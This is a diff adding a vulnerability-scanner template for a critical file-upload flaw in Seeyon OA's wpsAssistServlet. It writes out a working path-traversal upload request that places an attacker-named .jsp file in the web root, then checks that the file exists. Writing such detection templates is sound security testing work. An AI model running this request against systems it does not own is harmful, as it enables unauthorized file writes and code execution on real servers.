@@ -1,0 +1,43 @@
+id: seeyon-wpsassistservlet-fileupload
+
+info:
+  name: 致远 OA wpsAssistServlet 文件上传
+  author: 123456
+  severity: critical
+  verified: true
+  description: |
+    致远OA A6、A8、A8N (V8.0SP2,V8.1,V8.1SP1)
+    致远OA G6、G6N (V8.1、V8.1SP1)
+    app="致远互联-OA" && title="V8.0SP2"
+  tags: seeyon,fileupload
+  created: 2023/05/26
+  requires: [seeyon]
+  requires-mode: opportunistic
+
+set:
+  rfilename: randomLowercase(12)
+  r2: randomInt(40000, 44800)
+  r3: randomInt(40000, 44800)
+  rboundary: randomLowercase(8)
+  rbody: randomLowercase(32)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/{{rfilename}}.jsp&fileId=2
+      headers:
+        Content-Type: multipart/form-data; boundary=----{{rboundary}}
+      body: |
+        ------{{rboundary}}
+        Content-Disposition: form-data; name="upload"; filename="123.xls"
+        Content-Type: application/vnd.ms-excel
+
+        {{rbody}}
+        ------{{rboundary}}--
+    expression: response.status == 200 && response.body.bcontains(b'"officeTransResultFlag":"Y"')
+  r1:
+    request:
+      method: GET
+      path: /{{rfilename}}.jsp
+    expression: response.status == 200 && response.body.bcontains(bytes(rbody))
+expression: r0() && r1()
